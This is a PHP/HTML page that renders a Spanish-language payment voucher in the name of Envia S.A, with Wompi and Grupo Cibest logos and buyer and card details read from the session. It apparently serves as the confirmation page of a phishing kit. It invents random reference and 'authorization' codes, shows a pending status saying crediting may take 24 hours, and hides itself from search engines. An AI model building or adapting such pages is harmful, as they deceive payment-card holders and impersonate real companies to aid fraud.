<?php
session_start();

/* ==== Zona horaria Colombia y timestamp actual ==== */
date_default_timezone_set('America/Bogota');
$when = date('Y-m-d H:i:s'); // Fecha/hora actual en Colombia

/* ==== Datos desde sesión (con fallback genérico) ==== */
$merchant = $_SESSION['merchant'] ?? 'Envia S.A';
$amount   = $_SESSION['amount']   ?? '$3.800';
$currency = $_SESSION['currency'] ?? 'COP';

$name  = $_SESSION['name']  ?? $_SESSION['holder'] ?? 'Cliente';
$email = $_SESSION['email'] ?? 'correo@dominio.com';
$phone = $_SESSION['phone'] ?? $_SESSION['phone_number'] ?? $_SESSION['telefono'] ?? '+57 —';

$method = $_SESSION['method'] ?? 'Tarjeta';
$brand  = $_SESSION['card_brand'] ?? 'Tarjeta';
$last4  = $_SESSION['card_last4'] ?? '1234';
$exp    = $_SESSION['exp']        ?? '09/25';

/* ==== Datos transaccionales genéricos ==== */
$ref  = $_SESSION['reference']  ?? ('REF-' . strtoupper(substr(sha1(uniqid('', true)), 0, 8)));
$auth = $_SESSION['auth_code']  ?? strtoupper(substr(md5(uniqid('', true)), 0, 6));

/* ==== Helpers ==== */
function h($s){ return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
?>
<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Voucher de pago</title>
  <meta name="robots" content="noindex,nofollow" />
  <style>
    *,*::before,*::after{box-sizing:border-box}
    body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,'Helvetica Neue',Arial,sans-serif;background:#f5f7f9;color:#1f2937}
    :root{--radius:14px;--shadow:0 2px 4px -2px rgba(0,0,0,.1),0 10px 24px -8px rgba(0,0,0,.12);--border:#e5e7eb;--brand:#0ea765;--ink:#111827;--sub:#6b7280}
    .page{display:grid;place-items:start center;min-height:100svh;padding:24px 16px}
    .card{width:min(680px,100%);background:#fff;border-radius:var(--radius);box-shadow:var(--shadow);overflow:hidden}

    /* Top centrado (logo + estado debajo) */
    .top{
      display:flex; flex-direction:column; align-items:center; justify-content:center;
      gap:8px; padding:16px; border-bottom:1px solid var(--border); text-align:center
    }
    .brand{display:inline-flex;align-items:center;justify-content:center;gap:10px}
    .brand img{height:26px}
    .brand strong{font-weight:800}
    .status{
      display:inline-flex;gap:10px;align-items:center;justify-content:center;
      background:#FEF3C7;border:1px solid #FCD34D;color:#92400E;
      padding:6px 10px;border-radius:999px;font-weight:700;max-width:100%
    }
    .status small{font-weight:600;opacity:.85}

    .head{padding:18px 16px 8px;text-align:center}
    .merchant{margin:0;color:var(--ink);font-weight:700}
    .amount{color:var(--brand);font-size:1.9rem;font-weight:800;margin:8px 0 2px}
    .amount small{font-weight:600;font-size:.9rem;color:#374151;margin-left:6px}
    .muted{color:#6b7280}

    .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:14px 16px}
    .box{border:1px solid var(--border);border-radius:12px;padding:12px}
    .box h3{margin:0 0 8px;font-size:.95rem;color:#374151;font-weight:700}
    .row{display:flex;justify-content:space-between;gap:10px;margin:6px 0}
    .row span:first-child{color:#6b7280}

    .actions{display:flex;justify-content:flex-end;gap:10px;padding:0 16px 12px}
    .btn{display:inline-flex;align-items:center;gap:8px;padding:10px 14px;border-radius:10px;border:1px solid var(--border);background:#fff;cursor:pointer}
    .btn--primary{background:#111827;color:#e5ffb3;border-color:#111827;font-weight:800}
    .btn img{height:16px}

    .secure,.secure2{display:flex;gap:10px;justify-content:center;align-items:center;padding:12px 16px 16px;color:#6b7280;font-size:.9rem;border-top:1px dashed var(--border)}
    .secure img,.secure2 img{height:18px;opacity:.92}

    @media (max-width:640px){.grid{grid-template-columns:1fr}}
    @media print{.actions{display:none}.page{padding:0}.card{box-shadow:none;border:0;border-radius:0}}
  </style>
</head>
<body>
  <main class="page">
    <section class="card">
      <div class="top">
        <div class="brand">
          <img src="img/brands/mondaman.svg" alt="Logo" />
          <strong>Voucher de pago</strong>
        </div>
        <!-- Mensaje profesional de estado -->
        <div class="status">
         <tittle>En Proceso</tittle>
          <small>&nbsp;• Validación en curso. La acreditación del pago puede tardar hasta 24 horas en reflejarse en su entidad financiera.</small>
        </div>
      </div>

      <header class="head">
        <p class="merchant"><?= h($merchant) ?></p>
        <p class="amount"><?= h($amount) ?> <small><?= h($currency) ?></small></p>
        <p class="muted" style="margin:6px 0 0">Referencia: <strong><?= h($ref) ?></strong></p>
        <p class="muted" style="margin:2px 0 0">Fecha: <strong><?= h($when) ?></strong></p>
      </header>

      <div class="grid">
        <div class="box">
          <h3>Resumen del pago</h3>
          <div class="row"><span>Método</span><span><?= h($method) ?></span></div>
          <div class="row"><span>Autorización</span><span><?= h($auth) ?></span></div>
        </div>
        <div class="box">
          <h3>Comprador</h3>
          <div class="row"><span>Nombre</span><span><?= h($name) ?></span></div>
          <div class="row"><span>Correo</span><span><?= h($email) ?></span></div>
          <div class="row"><span>Teléfono</span><span><?= h($phone) ?></span></div>
          <div class="row"><span>Estado</span><span>En Proceso</span></div>
        </div>
      </div>

      <div class="actions">
        <button class="btn" onclick="window.print()">
          <img src="img/icons/print.svg" alt=""> Imprimir
        </button>
        <a class="btn btn--primary" href="https://envia.co">
          <img src="img/icons/arrow-left.svg" alt=""> Volver al inicio
        </a>
      </div>

      <div class="secure"><img src="img/logos/wompi.svg" alt="Wompi" /></div>
      <div class="secure2"><img src="img/logos/grupo-cibest.svg" alt="Grupo Cibest" /></div>
    </section>
  </main>
</body>
</html>
